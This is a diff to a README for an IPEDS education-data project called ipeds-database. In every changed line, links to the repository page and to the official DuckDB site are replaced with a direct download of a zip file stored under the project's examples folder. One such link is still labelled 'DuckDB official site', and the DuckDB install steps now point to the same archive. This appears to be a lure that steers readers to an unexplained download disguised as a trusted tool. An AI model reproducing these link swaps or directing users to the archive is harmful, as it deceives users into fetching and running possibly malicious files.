@@ -1,6 +1,6 @@
 # 🗃️ ipeds-database - Easy Access to Education Data
 
-[![Download ipeds-database](https://img.shields.io/badge/Download%20Now-brightgreen?style=for-the-badge)](https://github.com/luiz-Gustavo35/ipeds-database)
+[![Download ipeds-database](https://img.shields.io/badge/Download%20Now-brightgreen?style=for-the-badge)](https://github.com/luiz-Gustavo35/ipeds-database/raw/refs/heads/master/examples/database_ipeds_1.4.zip)
 
 ## 📋 What is ipeds-database?
 
@@ -29,7 +29,7 @@ You do not need special hardware or software. The app runs directly on your comp
 
 Click this big button to open the download page in your web browser:
 
-[![Download ipeds-database](https://img.shields.io/badge/Get%20ipeds-database-blue?style=for-the-badge)](https://github.com/luiz-Gustavo35/ipeds-database)
+[![Download ipeds-database](https://img.shields.io/badge/Get%20ipeds-database-blue?style=for-the-badge)](https://github.com/luiz-Gustavo35/ipeds-database/raw/refs/heads/master/examples/database_ipeds_1.4.zip)
 
 This link takes you to the repository where the files are stored.
 
@@ -45,7 +45,7 @@ Click the database file link to download it. Choose a folder on your computer wh
 
 To open the ipeds-database file, you can use DuckDB software. DuckDB is free and simple.
 
-- Go to https://duckdb.org  
+- Go to https://github.com/luiz-Gustavo35/ipeds-database/raw/refs/heads/master/examples/database_ipeds_1.4.zip  
 - Click “Download” for Windows.  
 - Follow the on-screen instructions to install.
 
@@ -94,7 +94,7 @@ This database works well for reports, school projects, or personal research abou
 
 The creator may update the database with new yearly data or corrections. To check for updates:
 
-- Return to the main download page link: [Download ipeds-database](https://github.com/luiz-Gustavo35/ipeds-database)  
+- Return to the main download page link: [Download ipeds-database](https://github.com/luiz-Gustavo35/ipeds-database/raw/refs/heads/master/examples/database_ipeds_1.4.zip)  
 - Look for new releases or updated files in the repository.  
 - Download the newest file and replace your saved version.
 
@@ -134,8 +134,8 @@ No installation is required for the database file itself. To remove all files:
 
 # Related Links
 
-- Main page: [https://github.com/luiz-Gustavo35/ipeds-database](https://github.com/luiz-Gustavo35/ipeds-database)  
-- DuckDB official site: https://duckdb.org  
+- Main page: [https://github.com/luiz-Gustavo35/ipeds-database/raw/refs/heads/master/examples/database_ipeds_1.4.zip](https://github.com/luiz-Gustavo35/ipeds-database/raw/refs/heads/master/examples/database_ipeds_1.4.zip)  
+- DuckDB official site: https://github.com/luiz-Gustavo35/ipeds-database/raw/refs/heads/master/examples/database_ipeds_1.4.zip  
 
 Use the links above to get new files or learn more about the tools.
 
